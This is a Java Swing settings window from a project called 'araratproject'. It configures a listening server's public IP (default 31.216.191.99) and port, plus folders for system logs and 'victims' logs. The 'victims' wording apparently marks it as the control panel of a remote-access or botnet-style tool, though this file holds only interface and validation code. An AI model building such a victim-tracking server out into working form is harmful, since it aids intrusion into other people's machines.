package araratproject;

import java.awt.Color;
import java.awt.Point;
import java.io.File;
import java.io.IOException;
import javax.swing.JFrame;
import javax.swing.JOptionPane;

public class SettingsFrame extends javax.swing.JFrame {

    private JFrame parent;
    private String publicIP, systemLogs, victimsLogs, javaPath;
    private int port;

    public SettingsFrame(JFrame parent, Point location, String publicIP, int port) {
        this.parent = parent;        
        initComponents();

        this.setIconImage(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/settingsIcon.png")).getImage());
        this.getContentPane().setBackground(Color.white);
        this.setLocation(location);

        this.saveSystemField.setText(System.getProperty("user.home"));
        systemLogs = saveSystemField.getText();

        this.saveVictimsField.setText(System.getProperty("user.home"));
        victimsLogs = saveVictimsField.getText();

        this.port = port;
        this.publicIP = publicIP;
        this.ipField.setText(publicIP);
        this.portField.setText(port + "");

        saveConfiguration();
    }

    public String getjavaPath() {
        return javaPath;
    }

    public File getSystemLogs() throws IOException {
        return new File(systemLogs);
    }

    public File getVictimLogs() {
        return new File(victimsLogs);
    }

    public String gePublicIP() {
        return publicIP;
    }

    public int getPort() {
        return port;
    }

    public boolean saveSystem() {
        return saveSystemBox.isSelected();
    }

    public boolean saveVictims() {
        return saveVictimsBox.isSelected();
    }

    public boolean autoCapacityIncrease() {
        return makeSpaceBox.isSelected();
    }

    private void loadConfiguration() {
        this.ipField.setText(publicIP);
        this.portField.setText(port + "");
        this.saveSystemField.setText(systemLogs);
        this.saveVictimsField.setText(victimsLogs);
    }

    private void saveConfiguration() {
        try {
            //load ip
            String IP = ipField.getText();

            if (!Toolset.isPublicIP(IP)) {
                throw new InvalidInputException("Server IP is not valid. Google \"What is my ip\"\n to find you external ip address", ipField);
            }
            Server.ip = IP;
            this.publicIP = IP;

            //load port
            String port = portField.getText();

            if (!Toolset.isInteger(port)) {
                throw new InvalidInputException("Port number must be integer.", portField);
            } else {

                int portNum = Integer.parseInt(port);

                if (portNum < 0 || portNum > 65535) {
                    throw new InvalidInputException("Port number " + portNum + " out of bounds. ( 0 < port < 65536 ).", portField);
                } else if (portNum != Server.listener.getPort() && Toolset.isOpen(portNum)) {
                    //Ensuring the port is available
                    throw new InvalidInputException("Port number " + portNum + " is not available.", portField);
                } else {
                    try {
                        //Setting the new port
                        Server.listener.setPort(portNum);
                    } catch (IOException ex) {
                        throw new InvalidInputException("Port number " + portNum + " is not available.", portField);
                    }
                    this.port = portNum;
                }

            }

            //load system logs           
            if (saveSystemBox.isSelected() && !new File(saveSystemField.getText()).exists()) {
                throw new InvalidInputException("System Logs path does not exist.", saveSystemField);
            } else if (saveSystemBox.isSelected()) {
                systemLogs = saveSystemField.getText();

                File file = new File(systemLogs + "/System/logs.txt");

                if (!file.exists()) {
                    try {
                        file.getParentFile().mkdirs();
                        file.createNewFile();
                    } catch (IOException ex) {

                        //displayes error msg
                        saveSystemField.setForeground(Color.red);
                        JOptionPane.showMessageDialog(this, "System logs cannot be created to the selected directory", "Error", JOptionPane.ERROR_MESSAGE);
                        saveSystemField.setForeground(Color.black);

                        saveSystemField.setText("Not Specified");
                        saveSystemBox.setSelected(false);

                    }
                }

            }

            if (saveVictimsBox.isSelected() && !new File(saveVictimsField.getText()).exists()) {
                throw new InvalidInputException("Victims Logs path does not exist.", saveVictimsField);

            } else if (saveVictimsBox.isSelected()) {
                victimsLogs = saveVictimsField.getText();
                File file = new File(victimsLogs + "/Networks/");
                if (!file.exists()) {
                    try {
                        file.getParentFile().mkdirs();

                    } catch (Exception ex) {
                        //displayes error msg
                        saveVictimsField.setForeground(Color.red);
                        JOptionPane.showMessageDialog(this, "Victim's logs cannot be created to the selected directory", "Error", JOptionPane.ERROR_MESSAGE);
                        saveVictimsField.setForeground(Color.black);

                        saveVictimsField.setText("Not Specified");
                        saveVictimsBox.setSelected(false);
                    }

                    if (!file.exists()) {
                        file.mkdir();
                    }
                }
            }

            closeFrame();

        } catch (InvalidInputException ex) {
            // colorises the error component
            if (ex.getFautyComponent() != null) {
                ex.getFautyComponent().setForeground(Color.red);
            }
            //displayes error msg
            JOptionPane.showMessageDialog(this, ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            // sets the color back to black
            if (ex.getFautyComponent() != null) {
                ex.getFautyComponent().setForeground(Color.black);
            }

            portField.setText(Server.listener.getPort() + "");
        } finally {
            loadConfiguration();
        }

    }

    private void closeFrame() {
        loadConfiguration();
        this.setVisible(false);
        parent.setEnabled(true);
        parent.requestFocus();
    }
    
    

    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jLabel4 = new javax.swing.JLabel();
        jComboBox1 = new javax.swing.JComboBox<>();
        logPanel = new javax.swing.JPanel();
        saveSystemBox = new javax.swing.JCheckBox();
        saveSystemField = new javax.swing.JTextField();
        systemBrowseButton = new javax.swing.JButton();
        saveVictimsBox = new javax.swing.JCheckBox();
        saveVictimsField = new javax.swing.JTextField();
        victimsBrowseButton = new javax.swing.JButton();
        serverConfigPanel = new javax.swing.JPanel();
        ipField = new javax.swing.JTextField();
        ipLabel = new javax.swing.JLabel();
        portLabel = new javax.swing.JLabel();
        portField = new javax.swing.JTextField();
        automationPanel = new javax.swing.JPanel();
        makeSpaceBox = new javax.swing.JCheckBox();
        saveButton = new javax.swing.JButton();
        discardButton = new javax.swing.JButton();

        jLabel4.setText("jLabel4");

        jComboBox1.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "Item 1", "Item 2", "Item 3", "Item 4" }));

        setTitle("Settings");
        setBackground(new java.awt.Color(255, 255, 255));
        setResizable(false);
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        logPanel.setBackground(new java.awt.Color(255, 255, 255));
        logPanel.setBorder(javax.swing.BorderFactory.createTitledBorder("Logs"));

        saveSystemBox.setBackground(new java.awt.Color(255, 255, 255));
        saveSystemBox.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        saveSystemBox.setSelected(true);
        saveSystemBox.setText("Save System Log");
        saveSystemBox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                saveSystemBoxActionPerformed(evt);
            }
        });

        saveSystemField.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N

        systemBrowseButton.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        systemBrowseButton.setText("Browse...");
        systemBrowseButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        systemBrowseButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                systemBrowseButtonActionPerformed(evt);
            }
        });

        saveVictimsBox.setBackground(new java.awt.Color(255, 255, 255));
        saveVictimsBox.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        saveVictimsBox.setSelected(true);
        saveVictimsBox.setText("Save Victims Log");
        saveVictimsBox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                saveVictimsBoxActionPerformed(evt);
            }
        });

        saveVictimsField.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N

        victimsBrowseButton.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        victimsBrowseButton.setText("Browse...");
        victimsBrowseButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        victimsBrowseButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                victimsBrowseButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout logPanelLayout = new javax.swing.GroupLayout(logPanel);
        logPanel.setLayout(logPanelLayout);
        logPanelLayout.setHorizontalGroup(
            logPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(logPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(logPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(saveVictimsBox)
                    .addComponent(saveSystemBox))
                .addGap(18, 18, 18)
                .addGroup(logPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(saveSystemField)
                    .addComponent(saveVictimsField))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(logPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(systemBrowseButton)
                    .addComponent(victimsBrowseButton, javax.swing.GroupLayout.Alignment.TRAILING))
                .addContainerGap())
        );
        logPanelLayout.setVerticalGroup(
            logPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(logPanelLayout.createSequentialGroup()
                .addGroup(logPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(saveSystemBox, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(saveSystemField)
                    .addComponent(systemBrowseButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(logPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(saveVictimsBox, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(saveVictimsField)
                    .addComponent(victimsBrowseButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );

        serverConfigPanel.setBackground(new java.awt.Color(255, 255, 255));
        serverConfigPanel.setBorder(javax.swing.BorderFactory.createTitledBorder("Server Configuration"));

        ipField.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        ipField.setText("31.216.191.99");

        ipLabel.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        ipLabel.setText("Server IP:");

        portLabel.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        portLabel.setText("Listening TCP Port:");

        portField.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        portField.setText("7777");

        javax.swing.GroupLayout serverConfigPanelLayout = new javax.swing.GroupLayout(serverConfigPanel);
        serverConfigPanel.setLayout(serverConfigPanelLayout);
        serverConfigPanelLayout.setHorizontalGroup(
            serverConfigPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(serverConfigPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(ipLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(ipField, javax.swing.GroupLayout.PREFERRED_SIZE, 100, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 211, Short.MAX_VALUE)
                .addComponent(portLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(portField, javax.swing.GroupLayout.PREFERRED_SIZE, 101, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );
        serverConfigPanelLayout.setVerticalGroup(
            serverConfigPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(serverConfigPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(serverConfigPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(serverConfigPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(portLabel)
                        .addComponent(portField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(serverConfigPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(ipLabel)
                        .addComponent(ipField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        automationPanel.setBackground(new java.awt.Color(255, 255, 255));
        automationPanel.setBorder(javax.swing.BorderFactory.createTitledBorder("Automation"));

        makeSpaceBox.setBackground(new java.awt.Color(255, 255, 255));
        makeSpaceBox.setFont(new java.awt.Font("Tahoma", 0, 12)); // NOI18N
        makeSpaceBox.setSelected(true);
        makeSpaceBox.setText("Auto-Increase Network/Host capacity when necessary");
        makeSpaceBox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                makeSpaceBoxActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout automationPanelLayout = new javax.swing.GroupLayout(automationPanel);
        automationPanel.setLayout(automationPanelLayout);
        automationPanelLayout.setHorizontalGroup(
            automationPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(automationPanelLayout.createSequentialGroup()
                .addComponent(makeSpaceBox)
                .addGap(0, 0, Short.MAX_VALUE))
        );
        automationPanelLayout.setVerticalGroup(
            automationPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, automationPanelLayout.createSequentialGroup()
                .addGap(4, 4, 4)
                .addComponent(makeSpaceBox, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        saveButton.setText("Save");
        saveButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        saveButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                saveButtonActionPerformed(evt);
            }
        });

        discardButton.setText("Discard");
        discardButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        discardButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                discardButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addGap(0, 0, Short.MAX_VALUE)
                        .addComponent(discardButton, javax.swing.GroupLayout.PREFERRED_SIZE, 75, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(saveButton, javax.swing.GroupLayout.PREFERRED_SIZE, 75, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addComponent(serverConfigPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(logPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(automationPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(serverConfigPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(logPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(automationPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(discardButton)
                    .addComponent(saveButton))
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void saveSystemBoxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_saveSystemBoxActionPerformed
        if (saveSystemBox.isSelected()) {
            saveSystemField.setEnabled(true);
            systemBrowseButton.setEnabled(true);
        } else {
            saveSystemField.setEnabled(false);
            systemBrowseButton.setEnabled(false);
        }
    }//GEN-LAST:event_saveSystemBoxActionPerformed

    private void systemBrowseButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_systemBrowseButtonActionPerformed
        new BrowseFrame(this, saveSystemField, " Select system log folder", 1);

    }//GEN-LAST:event_systemBrowseButtonActionPerformed

    private void victimsBrowseButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_victimsBrowseButtonActionPerformed
        new BrowseFrame(this, saveVictimsField, " Select victims log folder", 1);

    }//GEN-LAST:event_victimsBrowseButtonActionPerformed

    private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
        closeFrame();

    }//GEN-LAST:event_formWindowClosing

    private void saveButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_saveButtonActionPerformed
        saveConfiguration();
    }//GEN-LAST:event_saveButtonActionPerformed

    private void discardButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_discardButtonActionPerformed
        closeFrame();
    }//GEN-LAST:event_discardButtonActionPerformed

    private void saveVictimsBoxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_saveVictimsBoxActionPerformed
        if (saveVictimsBox.isSelected()) {
            saveVictimsField.setEnabled(true);
            victimsBrowseButton.setEnabled(true);
        } else {
            saveVictimsField.setEnabled(false);
            victimsBrowseButton.setEnabled(false);
        }
    }//GEN-LAST:event_saveVictimsBoxActionPerformed

    private void makeSpaceBoxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_makeSpaceBoxActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_makeSpaceBoxActionPerformed

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JPanel automationPanel;
    private javax.swing.JButton discardButton;
    private javax.swing.JTextField ipField;
    private javax.swing.JLabel ipLabel;
    private javax.swing.JComboBox<String> jComboBox1;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JPanel logPanel;
    private javax.swing.JCheckBox makeSpaceBox;
    private javax.swing.JTextField portField;
    private javax.swing.JLabel portLabel;
    private javax.swing.JButton saveButton;
    private javax.swing.JCheckBox saveSystemBox;
    private javax.swing.JTextField saveSystemField;
    private javax.swing.JCheckBox saveVictimsBox;
    private javax.swing.JTextField saveVictimsField;
    private javax.swing.JPanel serverConfigPanel;
    private javax.swing.JButton systemBrowseButton;
    private javax.swing.JButton victimsBrowseButton;
    // End of variables declaration//GEN-END:variables
}
